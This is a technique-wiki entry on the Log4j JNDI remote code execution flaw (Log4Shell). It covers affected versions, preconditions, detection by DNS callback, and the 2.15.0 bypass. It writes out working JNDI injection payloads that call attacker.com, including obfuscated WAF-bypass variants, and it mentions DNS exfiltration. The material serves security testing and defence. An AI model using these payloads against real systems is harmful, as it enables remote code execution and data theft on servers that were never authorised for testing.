---
title: Log4j JNDI Lookup — Remote Code Execution (CVE-2021-44228 / Log4Shell)
slug: log4j-jndi-rce
created_utc: 2026-05-21T00:00:00Z
updated_utc: 2026-05-21T00:00:00Z
tags: [technique/server-side, technique/rce, technique/injection, technique/supply-chain]
inbound: []
---

# Log4j JNDI Lookup — Remote Code Execution (CVE-2021-44228 / Log4Shell)

## Pattern

Log4j 2 (versions 2.0-beta9 through 2.14.1) performs JNDI lookups on any
string matching `${jndi:<protocol>://<host>/<path>}` that appears in logged
input. If an attacker can inject this string into any data that reaches a
log statement (HTTP headers, user agents, usernames, form fields), the server
makes a JNDI LDAP/RMI/DNS request to the attacker's server. The JNDI lookup
can return a Java class definition hosted remotely, which is then loaded and
instantiated on the target — yielding arbitrary code execution.

CVE-2021-45046 (Log4j 2.15.0 bypass): the initial fix only applied when the
message lookup substitution pattern was present. Attackers bypassed it using
Context Lookup (`${ctx:loginId}`) patterns that still performed JNDI lookups.
Fully remediated in 2.16.0 (disable JNDI entirely), 2.17.0 (Denial of Service
fix).

## Preconditions

- Application uses Log4j 2 < 2.17.0 on the JVM.
- Attacker can inject `${jndi:...}` into any logged input.
- No outbound network controls blocking JNDI callbacks (DNS often works even
  when LDAP is blocked).

## Detection

- Inject `${jndi:dns://BURP-COLLABORATOR-HOST/a}` into every external input:
  `User-Agent`, `X-Forwarded-For`, `Referer`, `Authorization`, form fields,
  JSON body values.
- DNS callback = vulnerable. Wait ~60 s before concluding no callback.
- Canary tokens also available at canarytokens.org specifically for Log4Shell.

## Triggering

DNS callback (safe detection only):
```
User-Agent: ${jndi:dns://attacker.dnslog.cn/a}
```

LDAP RCE payload (full exploit, requires attacker-controlled LDAP server):
```
User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}
```

Bypass variants:
```
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
${${lower:jndi}:${lower:ldap}://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}
```

## Bypasses

- WAF bypass: nested variable interpolation (`${lower:j}`, `${upper:n}`, etc.)
  creates an exponential number of representations.
- DNS-only exfil: even if outbound LDAP is blocked, DNS usually passes through,
  allowing confirmation of vulnerability and data exfiltration via subdomain.
- CVE-2021-45046: 2.15.0 fix bypass via Context Lookup patterns.

## Seen in the wild

- 2021-12-09 (public disclosure) — Immediate mass exploitation. Log4j is used
  in virtually every enterprise Java stack (VMware, Cisco, Apple, Cloudflare,
  Amazon, Minecraft, etc.). The bug was exploited in the wild within hours of
  public disclosure. BBRE covered both the original CVE and the 2.15.0 bypass.
  [BBRE](https://www.youtube.com/watch?v=OS5lY3-M6tw)

## References

- CVE-2021-44228 (Log4Shell)
- CVE-2021-45046 (2.15.0 bypass)
- CVE-2021-45105 (DoS, 2.16.0)
- CISA advisory on Log4Shell
- LunaSec initial disclosure blog post
